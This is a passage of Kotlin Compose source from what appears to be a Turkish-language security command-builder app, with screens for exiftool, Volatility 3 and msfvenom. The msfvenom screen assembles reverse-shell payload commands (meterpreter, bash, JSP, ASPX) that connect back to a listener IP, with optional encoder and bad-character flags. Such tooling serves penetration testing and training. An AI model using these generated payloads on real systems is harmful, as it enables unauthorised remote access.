                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = filePath, onValueChange = { filePath = it }, label = { Text("Dosya Yolu (Resim, PDF, Office)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = when (action) {
            "view" -> "exiftool $filePath"
            "strip" -> "exiftool -all= --overwrite_original $filePath"
            "json" -> "exiftool -j $filePath > metadata.json"
            else -> ""
        }

        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 57. VOLATILITY 3
@Composable
fun VolatilityBuilder(language: AppLanguage) {
    var dumpFile by remember { mutableStateOf("memory.raw") }
    var plugin by remember { mutableStateOf("windows.pslist") }

    Column {
        OutlinedTextField(value = dumpFile, onValueChange = { dumpFile = it }, label = { Text("Bellek İmajı Dosya Yolu (-f)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Text(text = "VOLATILITY 3 EKLENTİSİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "windows.pslist" to "Süreç Listesi (pslist)",
                "windows.pstree" to "Süreç Ağacı (pstree)",
                "windows.netscan" to "Ağ Soketleri (netscan)",
                "windows.malfind" to "Enjekte Kod (malfind)",
                "windows.hashdump" to "Kayıt Defteri Hashleri",
                "windows.filescan" to "Açık Dosyalar (filescan)"
            ).forEach { (plg, lbl) ->
                val sel = plugin == plg
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { plugin = plg }.padding(horizontal = 8.dp, vertical = 6.dp)
                ) { Text(text = "$plg ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }

        val cmd = "python3 vol.py -f $dumpFile $plugin"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

// 58. MSFVENOM
@Composable
fun MsfvenomBuilder(language: AppLanguage) {
    var platform by remember { mutableStateOf("windows") }
    var payloadType by remember { mutableStateOf("meterpreter_reverse_tcp") }
    var lhost by remember { mutableStateOf("10.10.14.5") }
    var lport by remember { mutableStateOf("4444") }
    var format by remember { mutableStateOf("exe") }
    var encoder by remember { mutableStateOf("x86/shikata_ga_nai") }
    var enableEncoder by remember { mutableStateOf(false) }
    var iterations by remember { mutableStateOf("3") }
    var badChars by remember { mutableStateOf("\\x00\\x0a\\x0d") }
    var enableBadChars by remember { mutableStateOf(false) }
    var outputFile by remember { mutableStateOf("payload.exe") }

    Column {
        Text(text = "HEDEF PLATFORM", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "windows" to "Windows",
                "linux" to "Linux",
                "php" to "PHP",
                "aspx" to "ASPX",
                "jsp" to "JSP",
                "war" to "WAR",
                "android" to "Android",
                "python" to "Python",
                "bash" to "Bash"
            ).forEach { (plat, lbl) ->
                val isSelected = platform == plat
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable {
                            platform = plat
                            when (plat) {
                                "windows" -> { format = "exe"; outputFile = "payload.exe" }
                                "linux" -> { format = "elf"; outputFile = "payload.elf" }
                                "php" -> { format = "raw"; outputFile = "shell.php" }
                                "aspx" -> { format = "aspx"; outputFile = "shell.aspx" }
                                "jsp" -> { format = "raw"; outputFile = "shell.jsp" }
                                "war" -> { format = "war"; outputFile = "shell.war" }
                                "android" -> { format = "raw"; outputFile = "payload.apk" }
                                "python" -> { format = "raw"; outputFile = "shell.py" }
                                "bash" -> { format = "raw"; outputFile = "shell.sh" }
                            }
                        }
                        .padding(horizontal = 10.dp, vertical = 6.dp)
                ) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = lhost, onValueChange = { lhost = it }, label = { Text("Dinleyici IP (LHOST)") }, modifier = Modifier.weight(2f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = lport, onValueChange = { lport = it }, label = { Text("Port (LPORT)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = format, onValueChange = { format = it }, label = { Text("Format (-f)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = outputFile, onValueChange = { outputFile = it }, label = { Text("Çıktı Dosyası (-o)") }, modifier = Modifier.weight(1.5f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-e $encoder Şifreleyici (Encoder -i $iterations)", checked = enableEncoder, onCheckedChange = { enableEncoder = it })
        ToggleOption(label = "-b '$badChars' Hatalı Baytları Temizle", checked = enableBadChars, onCheckedChange = { enableBadChars = it })

        val fullPayload = when (platform) {
            "windows" -> if (payloadType.contains("meterpreter")) "windows/x64/meterpreter/reverse_tcp" else "windows/x64/shell_reverse_tcp"
            "linux" -> if (payloadType.contains("meterpreter")) "linux/x64/meterpreter/reverse_tcp" else "linux/x64/shell_reverse_tcp"
            "php" -> "php/meterpreter_reverse_tcp"
            "aspx" -> "windows/x64/meterpreter/reverse_tcp"
            "jsp" -> "java/jsp_shell_reverse_tcp"
            "war" -> "java/jsp_shell_reverse_tcp"
            "android" -> "android/meterpreter/reverse_tcp"
            "python" -> "python/meterpreter/reverse_tcp"
            "bash" -> "cmd/unix/reverse_bash"
            else -> "windows/x64/meterpreter/reverse_tcp"
        }

        val parts = mutableListOf("msfvenom", "-p", fullPayload, "LHOST=$lhost", "LPORT=$lport", "-f", format)
        if (enableEncoder) parts.addAll(listOf("-e", encoder, "-i", iterations))
        if (enableBadChars) parts.addAll(listOf("-b", "'$badChars'"))
        parts.addAll(listOf("-o", outputFile))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}
